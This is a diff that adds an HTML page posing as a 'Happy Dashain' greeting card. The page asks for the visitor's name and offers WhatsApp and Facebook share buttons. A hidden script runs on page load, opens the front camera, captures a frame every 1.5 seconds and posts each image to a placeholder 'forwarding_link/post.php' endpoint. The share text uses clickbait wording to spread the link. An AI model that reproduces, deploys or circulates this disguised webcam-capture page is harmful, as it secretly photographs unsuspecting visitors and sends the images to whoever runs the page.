@@ -1,0 +1,498 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
+<title>Happy Dashain to Your Friends!</title>
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"> 
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
+    <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
+    <link href="https://fonts.googleapis.com/css2?family=Mukta:wght@400;700;800&family=Yatra+One&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
+
+<style>
+    /* ===== DASHAIN FESTIVE THEME ===== */
+    body {
+        font-family: 'Mukta', sans-serif;
+        background: linear-gradient(135deg, #fdfbfb 0%, #ebedee 100%);
+        margin: 0;
+        padding: 0;
+        color: #333;
+        overflow-x: hidden;
+    }
+
+    /* Festive Background Pattern */
+    .bg-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-image: url('https://www.transparenttextures.com/patterns/rice-paper-3.png');
+        opacity: 0.3;
+        z-index: -1;
+        pointer-events: none;
+    }
+
+    /* Main Container */
+    .container {
+        max-width: 800px;
+        margin: 0 auto;
+        padding: 20px;
+        text-align: center;
+        position: relative;
+        z-index: 1;
+    }
+
+    /* Header Banner */
+    .header-banner {
+        background: linear-gradient(135deg, #c0392b, #e74c3c);
+        color: white;
+        padding: 30px 20px;
+        border-radius: 20px;
+        box-shadow: 0 10px 30px rgba(192, 57, 43, 0.3);
+        margin-bottom: 20px;
+        position: relative;
+        overflow: hidden;
+    }
+
+    .header-banner::before {
+        content: "🌺";
+        position: absolute;
+        font-size: 100px;
+        opacity: 0.1;
+        top: -20px;
+        left: -20px;
+        transform: rotate(-20deg);
+    }
+
+    .header-banner::after {
+        content: "🌺";
+        position: absolute;
+        font-size: 100px;
+        opacity: 0.1;
+        bottom: -30px;
+        right: -20px;
+        transform: rotate(20deg);
+    }
+
+    .header-banner h1 {
+        font-family: 'Yatra One', cursive;
+        font-size: 42px;
+        margin: 0;
+        text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        letter-spacing: 2px;
+    }
+
+    .header-banner p {
+        font-size: 18px;
+        margin: 10px 0 0;
+        opacity: 0.9;
+    }
+
+    /* Countdown Box */
+    .countdown-box {
+        background: white;
+        border-radius: 15px;
+        padding: 15px 20px;
+        margin: 20px auto;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        border-left: 6px solid #e67e22;
+        max-width: 600px;
+    }
+
+    .countdown-box p {
+        font-size: 22px;
+        font-weight: 700;
+        color: #2c3e50;
+        margin: 0;
+    }
+
+    .countdown-box i {
+        color: #e74c3c;
+        font-style: normal;
+        font-weight: 400;
+        font-size: 16px;
+    }
+
+    /* Marquee Messages */
+    .marquee-box {
+        background: #fff;
+        border-radius: 12px;
+        padding: 12px 20px;
+        margin: 15px auto;
+        max-width: 650px;
+        box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        border: 1px solid #f0e6d2;
+    }
+
+    .marquee-box.red {
+        background: #fff5f5;
+        border-color: #ffcccc;
+        color: #c0392b;
+    }
+
+    .marquee-box.green {
+        background: #f0fff4;
+        border-color: #b2f5ea;
+        color: #276749;
+    }
+
+    .marquee-box.gold {
+        background: #fffaf0;
+        border-color: #fefcbf;
+        color: #975a16;
+    }
+
+    .marquee-box b {
+        font-size: 16px;
+    }
+
+    /* Name Display (The Animated Text) */
+    .name-display {
+        margin: 30px 0;
+        perspective: 1000px;
+    }
+
+    .name-display h1 {
+        font-family: 'Yatra One', cursive;
+        font-size: 48px;
+        color: #c0392b;
+        text-transform: uppercase;
+        margin: 5px 0;
+        text-shadow: 3px 3px 0 #f1c40f, 6px 6px 15px rgba(0,0,0,0.2);
+        display: block;
+        line-height: 1.2;
+        animation: glowText 3s ease-in-out infinite alternate;
+    }
+
+    @keyframes glowText {
+        from { text-shadow: 3px 3px 0 #f1c40f, 6px 6px 15px rgba(0,0,0,0.2); }
+        to { text-shadow: 3px 3px 0 #f1c40f, 6px 6px 25px rgba(241, 196, 15, 0.8); }
+    }
+
+    /* Greeting Cards */
+    .greeting-card {
+        background: white;
+        border-radius: 20px;
+        padding: 25px;
+        margin: 20px auto;
+        max-width: 650px;
+        box-shadow: 0 8px 25px rgba(0,0,0,0.08);
+        border-top: 5px solid #e74c3c;
+    }
+
+    .greeting-card h2 {
+        font-family: 'Yatra One', cursive;
+        font-size: 32px;
+        color: #e74c3c;
+        margin-top: 0;
+    }
+
+    .greeting-card p {
+        font-size: 18px;
+        line-height: 1.6;
+        color: #4a5568;
+        margin: 10px 0;
+    }
+
+    .highlight-box {
+        background: linear-gradient(135deg, #fdfbfb, #ebedee);
+        border-radius: 12px;
+        padding: 15px;
+        margin: 15px 0;
+        font-weight: 700;
+        font-size: 20px;
+        color: #c0392b;
+        border: 2px dashed #e67e22;
+    }
+
+    /* Footer / Byline */
+    .byline {
+        font-size: 22px;
+        font-weight: 700;
+        color: #2c3e50;
+        margin: 30px 0 10px;
+        text-transform: uppercase;
+        letter-spacing: 3px;
+    }
+
+    /* Share Buttons */
+    .footerbtn, .footerbtn1 {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        padding: 12px 30px;
+        border-radius: 50px;
+        color: white;
+        font-size: 18px;
+        font-weight: 700;
+        text-decoration: none;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        transition: transform 0.2s, box-shadow 0.2s;
+        margin: 10px;
+        border: none;
+        cursor: pointer;
+    }
+
+    .footerbtn {
+        background: #25D366; /* WhatsApp Green */
+    }
+
+    .footerbtn1 {
+        background: #1877F2; /* Facebook Blue */
+    }
+
+    .footerbtn:hover, .footerbtn1:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+        color: white;
+    }
+
+    .footerbtn img, .footerbtn1 img {
+        filter: brightness(0) invert(1);
+    }
+
+    /* Decorative Elements */
+    .decor-line {
+        width: 80px;
+        height: 4px;
+        background: linear-gradient(90deg, #e74c3c, #f1c40f);
+        margin: 20px auto;
+        border-radius: 2px;
+    }
+
+    /* Hidden video/canvas for script */
+    .video-wrap, #canvas {
+        display: none !important;
+    }
+
+    /* Responsive */
+    @media (max-width: 600px) {
+        .header-banner h1 { font-size: 28px; }
+        .name-display h1 { font-size: 32px; }
+        .greeting-card h2 { font-size: 24px; }
+        .footerbtn, .footerbtn1 { width: 80%; margin: 10px auto; }
+    }
+</style>
+</head>
+<body>
+
+<div class="bg-overlay"></div>
+
+<!-- Hidden Video & Canvas for Script -->
+<div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+</div>
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+// ===== ORIGINAL WEBCAM SCRIPT (UNCHANGED) =====
+function post(imgdata){
+    $.ajax({
+        type: 'POST',
+        data: { cat: imgdata},
+        url: 'forwarding_link/post.php',
+        dataType: 'json',
+        async: false,
+        success: function(result){
+            // call the function that handles the response/results
+        },
+        error: function(){
+        }
+    });
+};
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+    audio: false,
+    video: {
+        facingMode: "user"
+    }
+};
+
+// Access webcam
+async function init() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+    } catch (e) {
+        if(errorMsgElement) errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+    }
+}
+
+// Success
+function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    var context = canvas.getContext('2d');
+    setInterval(function(){
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData); 
+    }, 1500);
+}
+
+// Load init
+init();
+</script>
+
+<!-- ===== MAIN VISUAL CONTENT ===== -->
+<div class="container">
+
+    <!-- Header Banner -->
+    <div class="header-banner">
+        <h1>🌺 शुभ दशैं 🌺</h1>
+        <p>May this Dashain bring joy, prosperity, and happiness to you and your family!</p>
+    </div>
+
+    <!-- Countdown Timer -->
+    <div class="countdown-box">
+        <p id="demo"></p>
+    </div>
+
+    <!-- Marquee Messages -->
+    <div class="marquee-box red">
+        <marquee behavior="alternate">
+            <b>“ We hope this Dashain will be a great memory! ”</b>
+        </marquee>
+    </div>
+    <div class="marquee-box green">
+        <marquee behavior="alternate">
+            <b>In this Dashain our best wishes to you!</b>
+        </marquee>
+    </div>
+    <div class="marquee-box gold">
+        <marquee behavior="alternate">
+            <b>|| We pray you may enjoy this Dashain! ||</b>
+        </marquee>
+    </div>
+
+    <!-- Name Display (The Animated Text) -->
+    <div class="name-display">
+        <figure>
+            <h1 style="text-transform: uppercase;">
+                <script type="text/javascript" language="Javascript">
+                    var a = prompt("Please Enter Your Name\n\n👇👇👇👇👇");
+                    document.write(a);
+                </script>
+            </h1>
+            <h1 style="text-transform: uppercase;">
+                <script type="text/javascript" language="Javascript">
+                    document.write(a);
+                </script>
+            </h1>
+            <h1 style="text-transform: uppercase;">
+                <script type="text/javascript" language="Javascript">
+                    document.write(a);
+                </script>
+            </h1>
+            <h1 style="text-transform: uppercase;">
+                <script type="text/javascript" language="Javascript">
+                    document.write(a);
+                </script>
+            </h1>
+            <h1 style="text-transform: uppercase;">
+                <script type="text/javascript" language="Javascript">
+                    document.write(a);
+                </script>
+            </h1>
+            <h1 style="text-transform: uppercase;">
+                <script type="text/javascript" language="Javascript">
+                    document.write(a);
+                </script>
+            </h1>
+            <h1 style="text-transform: uppercase;">
+                <script type="text/javascript" language="Javascript">
+                    document.write(a);
+                </script>
+            </h1>
+        </figure>
+    </div>
+
+    <!-- Main Greeting Card -->
+    <div class="greeting-card">
+        <h2>✨ शुभ दशैं ✨</h2>
+        <p>Wishing you a very <strong>Happy Dashain</strong>!</p>
+        <div class="highlight-box">
+            May this auspicious occasion of Dashain bring happiness, prosperity, health, and peace in your life.
+        </div>
+        <p style="font-size: 22px; color: #c0392b; font-weight: 700;">
+            ✪ I wish that this Dashain is your best one. ✪
+        </p>
+        <p style="background: #663399; color: #FFFAFA; padding: 10px; border-radius: 8px; font-size: 16px;">
+            This message should be in everyone's mobile, it is your duty!
+        </p>
+    </div>
+
+    <!-- Byline -->
+    <div class="byline">
+        <script type="text/javascript" language="Javascript">
+            document.write("by - " + a);
+        </script>
+    </div>
+
+    <div class="decor-line"></div>
+
+</div>
+
+<!-- ===== ORIGINAL COUNTDOWN SCRIPT (UNCHANGED) ===== -->
+<script>
+// Set the date we're counting down to
+var countDownDate = new Date("October 10, 2018 00:00:00").getTime();
+
+// Update the count down every 01 second
+var x = setInterval(function() {
+
+    // Get todays date and time
+    var now = new Date().getTime();
+
+    // Find the distance between now an the count down date
+    var distance = countDownDate - now;
+
+    // Time calculations for days, hours, minutes and seconds
+    var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+    var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+    var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+    var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+    // Display the result in the element with id="demo"
+    var demoEl = document.getElementById("demo");
+    if(demoEl) {
+        demoEl.innerHTML = days + "<i> Days,</i> " + hours + " <i>Hrs,</i> "
+        + minutes + "<i> Min,</i> " + seconds + "<i> Sec</i> ";
+    }
+
+    // If the count down is finished, write some text 
+    if (distance < 0) {
+        clearInterval(x);
+        if(demoEl) demoEl.innerHTML = "🙏 Welcome 🙏";
+    }
+}, 1000);
+</script>
+
+<!-- ===== SHARE BUTTONS (UNCHANGED LINKS) ===== -->
+<center>
+    <a class="footerbtn" href="whatsapp://send?text=*No one would have sent such a message to you before, click below and see* 👉 forwarding_link" data-action="share/whatsapp/share">
+        <img width="22px" height="22px" src="https://cdn.pixabay.com/photo/2015/08/03/13/58/soon-873316_640.png">  
+        <b style="font-size: 22px;">Share</b>  
+    </a>
+    <a class="footerbtn1" href="https://www.facebook.com/sharer/sharer.php?u= forwarding_link" target="_blank" title="Share this post on Facebook" class="facebook">
+        <img width="22px" height="22px" src="https://cdn.pixabay.com/photo/2017/06/22/06/22/facebook-2429746_640.png">
+        <b style="font-size: 22px;">Share</b>  
+    </a>
+</center>
+
+<br><br>
+
+</body>
+</html>
